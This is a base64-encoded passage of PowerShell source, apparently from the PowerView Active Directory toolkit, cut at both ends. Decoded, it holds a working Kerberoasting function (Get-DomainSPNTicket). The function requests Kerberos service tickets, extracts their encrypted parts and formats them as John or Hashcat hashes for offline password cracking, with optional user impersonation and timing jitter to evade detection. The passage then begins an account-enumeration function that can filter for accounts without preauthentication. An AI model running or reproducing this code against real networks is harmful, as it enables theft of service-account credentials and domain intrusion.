cyBub3QgZXhpc3QsIGNvdWxkIG5vdCBiZSBjb250YWN0ZWQsIHRoZXJlIGlzbid0IGFuIGV4aXN0aW5nIHRydXN0LCBvciB0aGUgc3BlY2lmaWVkIGNyZWRlbnRpYWxzIGFyZSBpbnZhbGlkOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgJERvbWFpbkNvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCgnRG9tYWluJywgJERvbWFpbikKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbl06OkdldERvbWFpbigkRG9tYWluQ29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbl0gVGhlIHNwZWNpZmllZCBkb21haW4gJyREb21haW4nIGRvZXMgbm90IGV4aXN0LCBjb3VsZCBub3QgYmUgY29udGFjdGVkLCBvciB0aGVyZSBpc24ndCBhbiBleGlzdGluZyB0cnVzdCA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXTo6R2V0Q3VycmVudERvbWFpbigpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5dIEVycm9yIHJldHJpZXZpbmcgdGhlIGN1cnJlbnQgZG9tYWluOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCgpmdW5jdGlvbiBHZXQtRG9tYWluU1BOVGlja2V0IHsKCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlNQTlRpY2tldCcpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnUmF3U1BOJyldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFBhcmFtZXRlclNldE5hbWUgPSAnUmF3U1BOJywgTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVBhdHRlcm4oJy4qLy4qJyldCiAgICAgICAgW0FsaWFzKCdTZXJ2aWNlUHJpbmNpcGFsTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkU1BOLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgUGFyYW1ldGVyU2V0TmFtZSA9ICdVc2VyJywgTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7ICRfLlBTT2JqZWN0LlR5cGVOYW1lc1swXSAtZXEgJ1Bvd2VyVmlldy5Vc2VyJyB9KV0KICAgICAgICBbT2JqZWN0W11dCiAgICAgICAgJFVzZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnSm9obicsICdIYXNoY2F0JyldCiAgICAgICAgW0FsaWFzKCdGb3JtYXQnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRPdXRwdXRGb3JtYXQgPSAnSm9obicsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDAsMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJERlbGF5ID0gMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMC4wLCAxLjApXQogICAgICAgIFtEb3VibGVdCiAgICAgICAgJEppdHRlciA9IC4zLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJE51bGwgPSBbUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoJ1N5c3RlbS5JZGVudGl0eU1vZGVsJykKCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXInXSkgewogICAgICAgICAgICAkVGFyZ2V0T2JqZWN0ID0gJFVzZXIKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRUYXJnZXRPYmplY3QgPSAkU1BOCiAgICAgICAgfQoJCgkkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tCgogICAgICAgIEZvckVhY2ggKCRPYmplY3QgaW4gJFRhcmdldE9iamVjdCkgewoKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlciddKSB7CiAgICAgICAgICAgICAgICAkVXNlclNQTiA9ICRPYmplY3QuU2VydmljZVByaW5jaXBhbE5hbWUKICAgICAgICAgICAgICAgICRTYW1BY2NvdW50TmFtZSA9ICRPYmplY3QuU2FtQWNjb3VudE5hbWUKICAgICAgICAgICAgICAgICREaXN0aW5ndWlzaGVkTmFtZSA9ICRPYmplY3QuRGlzdGluZ3Vpc2hlZE5hbWUKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRVc2VyU1BOID0gJE9iamVjdAogICAgICAgICAgICAgICAgJFNhbUFjY291bnROYW1lID0gJ1VOS05PV04nCiAgICAgICAgICAgICAgICAkRGlzdGluZ3Vpc2hlZE5hbWUgPSAnVU5LTk9XTicKICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBpZiBhIHVzZXIgaGFzIG11bHRpcGxlIFNQTnMgd2Ugb25seSB0YWtlIHRoZSBmaXJzdCBvbmUgb3RoZXJ3aXNlIHRoZSBzZXJ2aWNlIHRpY2tldCByZXF1ZXN0IGZhaWxzIG1pc2VyYWJseSA6KSAtQHN0M3IzMGJ5dDMKICAgICAgICAgICAgaWYgKCRVc2VyU1BOIC1pcyBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlJlc3VsdFByb3BlcnR5VmFsdWVDb2xsZWN0aW9uXSkgewogICAgICAgICAgICAgICAgJFVzZXJTUE4gPSAkVXNlclNQTlswXQogICAgICAgICAgICB9CgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFRpY2tldCA9IE5ldy1PYmplY3QgU3lzdGVtLklkZW50aXR5TW9kZWwuVG9rZW5zLktlcmJlcm9zUmVxdWVzdG9yU2VjdXJpdHlUb2tlbiAtQXJndW1lbnRMaXN0ICRVc2VyU1BOCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5TUE5UaWNrZXRdIEVycm9yIHJlcXVlc3RpbmcgdGlja2V0IGZvciBTUE4gJyRVc2VyU1BOJyBmcm9tIHVzZXIgJyREaXN0aW5ndWlzaGVkTmFtZScgOiAkXyIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFRpY2tldCkgewogICAgICAgICAgICAgICAgJFRpY2tldEJ5dGVTdHJlYW0gPSAkVGlja2V0LkdldFJlcXVlc3QoKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkVGlja2V0Qnl0ZVN0cmVhbSkgewogICAgICAgICAgICAgICAgJE91dCA9IE5ldy1PYmplY3QgUFNPYmplY3QKCiAgICAgICAgICAgICAgICAkVGlja2V0SGV4U3RyZWFtID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkVGlja2V0Qnl0ZVN0cmVhbSkgLXJlcGxhY2UgJy0nCgogICAgICAgICAgICAgICAgIyBUaWNrZXRIZXhTdHJlYW0gPT0gR1NTLUFQSSBGcmFtZSAoc2VlIGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmM0MTIxI3NlY3Rpb24tNC4xKQogICAgICAgICAgICAgICAgIyBObyBlYXN5IHdheSB0byBwYXJzZSBBU04xLCBzbyB3ZSdsbCB0cnkgc29tZSBqYW5reSByZWdleCB0byBwYXJzZSB0aGUgZW1iZWRkZWQgS1JCX0FQX1JFUS5UaWNrZXQgb2JqZWN0CiAgICAgICAgICAgICAgICBpZigkVGlja2V0SGV4U3RyZWFtIC1tYXRjaCAnYTM4Mi4uLi4zMDgyLi4uLkEwMDMwMjAxKD88RXR5cGVMZW4+Li4pQTEuezEsNH0uLi4uLi4uQTI4Mig/PENpcGhlclRleHRMZW4+Li4uLikuLi4uLi4uLig/PERhdGFUb0VuZD4uKyknKSB7CiAgICAgICAgICAgICAgICAgICAgJEV0eXBlID0gW0NvbnZlcnRdOjpUb0J5dGUoICRNYXRjaGVzLkV0eXBlTGVuLCAxNiApCiAgICAgICAgICAgICAgICAgICAgJENpcGhlclRleHRMZW4gPSBbQ29udmVydF06OlRvVUludDMyKCRNYXRjaGVzLkNpcGhlclRleHRMZW4sIDE2KS00CiAgICAgICAgICAgICAgICAgICAgJENpcGhlclRleHQgPSAkTWF0Y2hlcy5EYXRhVG9FbmQuU3Vic3RyaW5nKDAsJENpcGhlclRleHRMZW4qMikKCiAgICAgICAgICAgICAgICAgICAgIyBNYWtlIHN1cmUgdGhlIG5leHQgZmllbGQgbWF0Y2hlcyB0aGUgYmVnaW5uaW5nIG9mIHRoZSBLUkJfQVBfUkVRLkF1dGhlbnRpY2F0b3Igb2JqZWN0CiAgICAgICAgICAgICAgICAgICAgaWYoJE1hdGNoZXMuRGF0YVRvRW5kLlN1YnN0cmluZygkQ2lwaGVyVGV4dExlbioyLCA0KSAtbmUgJ0E0ODInKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgJ0Vycm9yIHBhcnNpbmcgY2lwaGVydGV4dCBmb3IgdGhlIFNQTiAgJCgkVGlja2V0LlNlcnZpY2VQcmluY2lwYWxOYW1lKS4gVXNlIHRoZSBUaWNrZXRCeXRlSGV4U3RyZWFtIGZpZWxkIGFuZCBleHRyYWN0IHRoZSBoYXNoIG9mZmxpbmUgd2l0aCBHZXQtS2VyYmVyb2FzdEhhc2hGcm9tQVBSZXEiJwogICAgICAgICAgICAgICAgICAgICAgICAkSGFzaCA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVGlja2V0Qnl0ZUhleFN0cmVhbScgKFtCaXRjb252ZXJ0ZXJdOjpUb1N0cmluZygkVGlja2V0Qnl0ZVN0cmVhbSkuUmVwbGFjZSgnLScsJycpKQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRIYXNoID0gIiQoJENpcGhlclRleHQuU3Vic3RyaW5nKDAsMzIpKWAkJCgkQ2lwaGVyVGV4dC5TdWJzdHJpbmcoMzIpKSIKICAgICAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUaWNrZXRCeXRlSGV4U3RyZWFtJyAkbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiVW5hYmxlIHRvIHBhcnNlIHRpY2tldCBzdHJ1Y3R1cmUgZm9yIHRoZSBTUE4gICQoJFRpY2tldC5TZXJ2aWNlUHJpbmNpcGFsTmFtZSkuIFVzZSB0aGUgVGlja2V0Qnl0ZUhleFN0cmVhbSBmaWVsZCBhbmQgZXh0cmFjdCB0aGUgaGFzaCBvZmZsaW5lIHdpdGggR2V0LUtlcmJlcm9hc3RIYXNoRnJvbUFQUmVxIgogICAgICAgICAgICAgICAgICAgICRIYXNoID0gJG51bGwKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RpY2tldEJ5dGVIZXhTdHJlYW0nIChbQml0Y29udmVydGVyXTo6VG9TdHJpbmcoJFRpY2tldEJ5dGVTdHJlYW0pLlJlcGxhY2UoJy0nLCcnKSkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZigkSGFzaCkgewogICAgICAgICAgICAgICAgICAgIGlmICgkT3V0cHV0Rm9ybWF0IC1tYXRjaCAnSm9obicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEhhc2hGb3JtYXQgPSAiYCRrcmI1dGdzYCQkKCRUaWNrZXQuU2VydmljZVByaW5jaXBhbE5hbWUpOiRIYXNoIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCREaXN0aW5ndWlzaGVkTmFtZSAtbmUgJ1VOS05PV04nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICREaXN0aW5ndWlzaGVkTmFtZS5TdWJTdHJpbmcoJERpc3Rpbmd1aXNoZWROYW1lLkluZGV4T2YoJ0RDPScpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICdVTktOT1dOJwogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAjIGhhc2hjYXQgb3V0cHV0IGZvcm1hdAogICAgICAgICAgICAgICAgICAgICAgICAkSGFzaEZvcm1hdCA9ICJgJGtyYjV0Z3NgJCQoJEV0eXBlKWAkKiRTYW1BY2NvdW50TmFtZWAkJFVzZXJEb21haW5gJCQoJFRpY2tldC5TZXJ2aWNlUHJpbmNpcGFsTmFtZSkqYCQkSGFzaCIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdIYXNoJyAkSGFzaEZvcm1hdAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU2FtQWNjb3VudE5hbWUnICRTYW1BY2NvdW50TmFtZQogICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEaXN0aW5ndWlzaGVkTmFtZScgJERpc3Rpbmd1aXNoZWROYW1lCiAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NlcnZpY2VQcmluY2lwYWxOYW1lJyAkVGlja2V0LlNlcnZpY2VQcmluY2lwYWxOYW1lCiAgICAgICAgICAgICAgICAkT3V0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5TUE5UaWNrZXQnKQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRPdXQKICAgICAgICAgICAgfQogICAgICAgICAgICAjIHNsZWVwIGZvciBvdXIgc2VtaS1yYW5kb21pemVkIGludGVydmFsCiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRSYW5kTm8uTmV4dCgoMS0kSml0dGVyKSokRGVsYXksICgxKyRKaXR0ZXIpKiREZWxheSkKICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIEdldC1Eb21haW5Vc2VyIHsKCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuVXNlcicpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Vc2VyLlJhdycpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnQWxsb3dEZWxlZ2F0aW9uJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnLCAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnLCAnTWVtYmVyTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNQTiwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQWRtaW5Db3VudCwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0FsbG93RGVsZWdhdGlvbicpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEFsbG93RGVsZWdhdGlvbiwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0Rpc2FsbG93RGVsZWdhdGlvbicpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJERpc2FsbG93RGVsZWdhdGlvbiwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVHJ1c3RlZFRvQXV0aCwKCiAgICAgICAgW0FsaWFzKCdLZXJiZXJvc1ByZWF1dGhOb3RSZXF1aXJlZCcsICdOb1ByZWF1dGgnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRQcmVhdXRoTm90UmVxdWlyZWQsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlY3VyaXR5TWFza3MsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW0FsaWFzKCdSZXR1cm5PbmUnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRGaW5kT25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQo8IwogICAgRHluYW1pY1BhcmFtIHsKICAgICAgICAkVUFDVmFsdWVOYW1lcyA9IFtFbnVtXTo6R2V0TmFtZXMoJFVBQ0VudW0pCiAgICAgICAgIyBhZGQgaW4gdGhlIG5lZ2F0aW9ucwogICAgICAgICRVQUNWYWx1ZU5hbWVzID0gJFVBQ1ZhbHVlTmFtZXMgfCBGb3JFYWNoLU9iamVjdCB7JF87ICJOT1RfJF8ifQogICAgICAgICMgY3JlYXRlIG5ldyBkeW5hbWljIHBhcmFtZXRlcgogICAgICAgIE5ldy1EeW5hbWljUGFyYW1ldGVyIC1OYW1lIFVBQ0ZpbHRlciAtVmFsaWRhdGVTZXQgJFVBQ1ZhbHVlTmFtZXMgLVR5cGUgKFthcnJheV0pCiAgICB9CiM+CiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlY3VyaXR5TWFza3MnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlY3VyaXR5TWFza3MnXSA9ICRTZWN1cml0eU1hc2tzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRVc2VyU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgI2JpbmQgZHluYW1pYyBwYXJhbWV0ZXIgdG8gYSBmcmllbmRseSB2YXJpYWJsZQogICAgICAgICNpZiAoJFBTQm91bmRQYXJhbWV0ZXJzIC1hbmQgKCRQU0JvdW5kUGFyYW1ldGVycy5Db3VudCAtbmUgMCkpIHsKICAgICAgICAjICAgIE5ldy1EeW5hbWljUGFyYW1ldGVyIC1DcmVhdGVWYXJpYWJsZXMgLUJvdW5kUGFyYW1ldGVycyAkUFNCb3VuZFBhcmFtZXRlcnMKICAgICAgICAjfQoKICAgICAgICBpZiAoJFVzZXJTZWFyY2hlcikgewogICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgPSAnJwogICAgICAgICAgICAkRmlsdGVyID0gJycKICAgICAgICAgICAgJElkZW50aXR5IHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkSWRlbnRpdHlJbnN0YW5jZSA9ICRfLlJlcGxhY2UoJygnLCAnXDI4JykuUmVwbGFjZSgnKScsICdcMjknKQogICAgICAgICAgICAgICAgaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXlMtMS0nKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0c2lkPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeQ049JykgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICBpZiAoKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgLWFuZCAoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBpZiBhIC1Eb21haW4gaXNuJ3QgZXhwbGljaXRseSBzZXQsIGV4dHJhY3QgdGhlIG9iamVjdCBkb21haW4gb3V0IG9mIHRoZSBkaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAjICAgYW5kIHJlYnVpbGQgdGhlIGRvbWFpbiBzZWFyY2hlcgogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Vc2VyXSBFeHRyYWN0ZWQgZG9tYWluICckSWRlbnRpdHlEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNlJyIKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRJZGVudGl0eURvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAkVXNlclNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkVXNlclNlYXJjaGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpblVzZXJdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4nIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZSAtaW1hdGNoICdeWzAtOUEtRl17OH0tKFswLTlBLU